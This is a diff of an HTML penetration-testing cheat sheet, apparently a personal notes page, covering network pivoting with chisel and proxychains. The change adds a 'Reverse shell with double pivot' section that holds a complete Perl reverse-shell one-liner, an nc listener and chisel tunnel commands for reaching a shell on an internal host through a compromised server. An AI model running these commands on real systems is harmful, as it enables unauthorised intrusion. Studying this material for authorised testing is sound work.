@@ -265,11 +265,9 @@ netstat <span class="nt">-bant</span> | findstr 1080
 
 <p>For compatibility with powershell-empire, use chisel 1.7.2.</p>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c">################</span>
-<span class="c"># Reverse pivoting with SOCKS5</span>
-<span class="c">################</span>
+<h3>Reverse pivot with SOCKS5</h3>
 
-<span class="c"># On your attack machine, run:</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># On your attack machine, run:</span>
 chisel server <span class="nt">-p</span> &lt;attack_machine_port&gt; <span class="nt">--socks5</span> <span class="nt">--reverse</span>
 
 <span class="c"># On the target, run:</span>
@@ -282,12 +280,11 @@ chisel client <span class="nt">--max-retry-count</span> 5 &lt;attack_machine_IP&
 
 <span class="c"># Then prepend any command with proxychains</span>
 <span class="nb">sudo </span>proxychains nmap &lt;...&gt;
+</code></pre></div>
 
-<span class="c">################</span>
-<span class="c"># Double reverse pivoting with SOCKS5</span>
-<span class="c">################</span>
+<h3>Double reverse pivot with SOCKS5</h3>
 
-<span class="c"># In /etc/proxychains4.conf, have two lines ready for double hop:</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># In /etc/proxychains4.conf, have two lines ready for double hop:</span>
 socks5  127.0.0.1 1080
 socks5  127.0.0.1 9999
 
@@ -305,12 +302,39 @@ chisel server <span class="nt">-v</span> <span class="nt">-p</span> 9050 <span c
 
 <span class="c"># On attack box, check that double hop is working:</span>
 <span class="nb">sudo </span>proxychains nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> <span class="nt">-n</span> <span class="nt">-p</span> 22 &lt;reachable IP through second target only&gt;
+</code></pre></div>
 
-<span class="c">################</span>
-<span class="c"># Bind pivoting with SOCKS5</span>
-<span class="c">################</span>
+<h3>Reverse shell with double pivot</h3>
 
-<span class="c"># If the target doesn't have a firewall restricting</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># This technique assumes the following scenario:</span>
+<span class="c"># Attack box &lt;-&gt; Linux compromised server &lt;-&gt; Linux server in local network only</span>
+<span class="c"># We want a reverse shell for that second target but we can't talk directly to it.</span>
+<span class="c"># We are however able to execute commands on it, for instance, with a proxychains pivot</span>
+<span class="c"># that let us access its vulnerable web server.</span>
+
+<span class="c"># Upload the following perl script on the target. Of course,</span>
+<span class="c"># any other language found on target could be used instead:</span>
+use Socket<span class="p">;</span><span class="nv">$i</span><span class="o">=</span><span class="s2">"&lt;Linux compromised server IP&gt;"</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span>&lt;Linux compromised server port&gt;<span class="p">;</span>socket<span class="o">(</span>S,PF_INET,SOCK_STREAM,getprotobyname<span class="o">(</span><span class="s2">"tcp"</span><span class="o">))</span><span class="p">;</span><span class="k">if</span><span class="o">(</span>connect<span class="o">(</span>S,sockaddr_in<span class="o">(</span><span class="nv">$p</span>,inet_aton<span class="o">(</span><span class="nv">$i</span><span class="o">)))){</span>open<span class="o">(</span>STDIN,<span class="s2">"&gt;&amp;S"</span><span class="o">)</span><span class="p">;</span>open<span class="o">(</span>STDOUT,<span class="s2">"&gt;&amp;S"</span><span class="o">)</span><span class="p">;</span>open<span class="o">(</span>STDERR,<span class="s2">"&gt;&amp;S"</span><span class="o">)</span><span class="p">;</span><span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/sh -i"</span><span class="o">)</span><span class="p">;</span><span class="o">}</span><span class="p">;</span>                            
+
+<span class="c"># On our attack box, set up a chisel server:</span>
+chisel server <span class="nt">-v</span> <span class="nt">-p</span> &lt;attack box chisel port&gt; <span class="nt">--reverse</span>
+
+<span class="c"># Set up a listener for the reverse shell too:</span>
+rlwrap nc <span class="nt">-lvnp</span> &lt;attack box listener port&gt;
+
+<span class="c"># On Linux compromised server, set up a chisel tunnel.</span>
+<span class="c"># For clarity, it's usually better to set the tunnel on</span>
+<span class="c"># the same port for both sides, e.g. 4444:127.0.0.1:4444.</span>
+./chisel client <span class="nt">--max-retry-count</span> 5 &lt;attack box IP&gt;:&lt;attack box chisel port&gt; &lt;Linux compromised server port&gt;:127.0.0.1:&lt;attack box listener port&gt;
+
+<span class="c"># On target, run our reverse shell script.</span>
+<span class="c"># We should finally catch a direct shell:</span>
+perl revshell.pl
+</code></pre></div>
+
+<h3>Bind pivot with SOCKS5</h3>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># If the target doesn't have a firewall restricting</span>
 <span class="c"># inbound connections, we might not have to use</span>
 <span class="c"># reverse pivoting.</span>
 
